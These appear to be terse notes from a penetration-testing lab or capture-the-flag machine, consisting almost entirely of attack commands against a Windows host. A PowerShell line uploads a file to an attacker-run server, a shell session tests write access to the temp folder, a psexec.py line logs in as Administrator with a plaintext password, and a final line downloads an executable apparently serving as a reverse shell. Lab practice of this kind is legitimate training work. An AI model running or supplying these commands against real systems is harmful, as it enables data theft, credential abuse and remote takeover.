Invoke-WebRequest -uri http://10.10.14.26:8000/upload -Method Post -Infile wp-out -ContentType 'text/plain'

C:\Users\Public>echo %TEMP% 
echo %TEMP%
C:\Windows\TEMP

C:\Users\Public>echo 'test' > %TEMP%\test
echo 'test' > %TEMP%\test

C:\Users\Public>type %TEMP%\test
type %TEMP%\test
'test'

psexec.py 'Administrator:!R3m0te!@10.10.10.180'

Invoke-RestMethod -uri http://10.10.14.26:8000/rs.exe -OutFile rs.exe